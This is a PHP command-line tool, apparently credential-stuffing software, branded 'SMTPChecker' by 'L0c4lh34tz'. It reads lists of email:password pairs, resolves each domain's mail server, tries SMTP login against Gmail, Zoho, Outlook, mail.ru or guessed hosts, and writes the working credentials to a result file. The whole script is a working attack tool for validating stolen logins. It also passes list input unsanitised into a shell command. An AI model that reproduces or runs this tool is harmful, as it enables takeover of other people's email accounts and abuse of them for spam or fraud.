<?php
require_once __DIR__."/vendor/autoload.php";

use \PHPMailer\PHPMailer\SMTP;
use \PHPMailer\PHPMailer\Exception;

Class SMTPCheck Extends SMTP {
    const PATH_LIST   = "list";
    const PATH_RESULT = "result";

    /**
    * Delete List Email After Check
    * 
    * Set to "true" if you want to delete data after check
    * @return boolean
    */
    const REMOVE_DATA_AFTER_CHECK = false;

    public function __construct()
    {
        self::cover();

        if(!shell_exec("host google.com")) {
            die("! Install package \"dnsutils\" first.\n\n");
        
        }

        if(!is_dir(self::PATH_RESULT)) {
            mkdir(self::PATH_RESULT);
        }
    }

    public function cover()
    {
        echo "\n\n";
        echo "+==================================================================+\n";
        echo "+   ____  __  __ _____ ____   ____ _               _               +\n";
        echo "+ / ___||  \/  |_   _|  _ \ / ___| |__   ___  ___| | _____ _ __    +\n";
        echo "+ \___ \| |\/| | | | | |_) | |   | '_ \ / _ \/ __| |/ / _ \ '__|   +\n";
        echo "+  ___) | |  | | | | |  __/| |___| | | |  __/ (__|   <  __/ |      +\n";
        echo "+ |____/|_|  |_| |_| |_|    \____|_| |_|\___|\___|_|\_\___|_|V.1.0 +\n";
        echo "+===================================================> By L0c4lh34tz+\n\n";                                                      
    }

    public function getList()
    {
        $no      = 1;
        $scandir = scandir(self::PATH_LIST);

        echo "+==== List File ====+\n";

        foreach($scandir as $file) {
            $_file = self::PATH_LIST."/".$file;
            $count = count(explode("\n", file_get_contents($_file)));

            if(!is_file($_file)) continue;
            echo "  [".$no++."] $file (Total: $count)\n";
        }

        echo "+===================+\n\n";

    }

    public function removeList($data, $lineToRemove)
    {
        $line = 1; 
        $open = explode("\n", file_get_contents($data));

        foreach($open as $list) { 
            $linesArray[$line] = $list; 
            $line++; 
        } 

        unset($linesArray[$lineToRemove]);
        self::save($data, "w+", implode("\n", $linesArray)); 
    }

    public function getHost($mail)
    {
        $check = @shell_exec("host ".$mail." | grep \"mail\" | cut -d \" \" -f 7 | sort -u | uniq -ui");

        if(preg_match("/gmail-smtp-in/i", $check)) return "smtp.gmail.com";
        elseif(preg_match("/google/i", $check)) return "smtp-relay.gmail.com";
        elseif(preg_match("/zoho/i", $check)) return "smtp.zoho.com";
        elseif(preg_match("/outlook/i", $check)) return "smtp-mail.outlook.com";
        elseif(preg_match("/mail.ru/i", $check)) return "smtp.mail.ru";
        else return $mail;
    }

    public function specialHost()
    {
        return [
            "smtp.gmail.com",
            "smtp-relay.gmail.com",
            "smtp.zoho.com",
            "smtp.mail.ru",
        ];
    }

	public function _connect($smtp = [])
    {
        $smtp = (object) $smtp;
        $smtp->host = strtolower($smtp->host);
        $smtp->port = 587;

        echo "<{$smtp->host}> {$smtp->user}:{$smtp->pass} ";

        try {
            if (!parent::connect($smtp->host, $smtp->port, 5)):
                throw new Exception("Connection Failed");
            endif;

            if (!parent::hello(gethostname())) {
                throw new Exception("EHLO Failed: " . parent::getError()["error"]);
            }

            $e = parent::getServerExtList();

            if (is_array($e) && array_key_exists("STARTTLS", $e)) {
                $tlsok = parent::startTLS();
                if (!$tlsok) {
                    throw new Exception("Failed to Start Encryption: " . parent::getError()["error"]);
                }

                if (!parent::hello(gethostname())) {
                    throw new Exception("EHLO (2) Gagal: " . parent::getError()["error"]);
                }

                $e = parent::getServerExtList();
            }

            if (is_array($e) && array_key_exists("AUTH", $e)) {
                if (parent::authenticate($smtp->user, $smtp->pass)) {
                    echo "[OK]\n";
                    self::save(self::PATH_RESULT."/smtp_".date("dmY").".txt", "a+", "{$smtp->host}:{$smtp->port}:{$smtp->user}:{$smtp->pass}");
                } else {
                    throw new Exception(parent::getError()["error"]);
                    
                }
            }
        } catch (Exception $e) {
            echo "[".$e->getMessage()."]\n";
        }

        parent::quit(true);
    }

    public function input() 
    {
        $handle = fopen("php://stdin", "r");
        $fgets  = fgets($handle);
        $fgets  = str_replace(["\n","\r"], "", $fgets);
        fclose($handle);
        return $fgets;
    }

    public function save($filename, $mode, $data)
    {
        $handle = fopen($filename, $mode);
        fwrite($handle, "$data\n");
        fclose($handle);
    }

    public function getDateTime()
    {
        return date("d/m/Y H:i:s");
    }
    
}

$smtp = new SMTPCheck();
$smtp->getList();

inputList:
$empass = readline("+ List: ");
$empass = $smtp::PATH_LIST."/".$empass;

if(!file_exists($empass)) {
    echo "! File \"".basename($empass)."\" Tidak ditemukan\n\n";
    goto inputList;
}

$no   = 0;
$open = explode("\n", file_get_contents($empass));


echo "+ Start checking list (".basename($empass).") and loaded ".count($open)." emails\n\n";

foreach($open as $no => $list) {
    $remove[$no] = $list;

    $explode = explode("|", $list);
    $host    = explode("@", $explode[0]);
    
    if(in_array($smtp->getHost($host[1]), $smtp->specialHost())) {

        $account = [
            "host" => trim($smtp->getHost($host[1])),
            "user" => trim($explode[0]),
            "pass" => trim($explode[1]),
        ];

        echo "[{$smtp->getDateTime()} ".($no+1)."/".count($open)."] ";
        $smtp->_connect($account);

    } else {

        $account = [
            "host" => trim("mail.".$host[1]),
            "user" => trim($explode[0]),
            "pass" => trim($explode[1]),
        ];

        echo "[{$smtp->getDateTime()} ".($no+1)."/".count($open)."] ";
        $smtp->_connect($account);

        $account = [
            "host" => trim("smtp.".$host[1]),
            "user" => trim($explode[0]),
            "pass" => trim($explode[1]),
        ];

        echo "[{$smtp->getDateTime()} ".($no+1)."/".count($open)."] ";
        $smtp->_connect($account);

    }

    if($smtp::REMOVE_DATA_AFTER_CHECK === true) {
        $smtp->removeList($empass, 1);
    }
}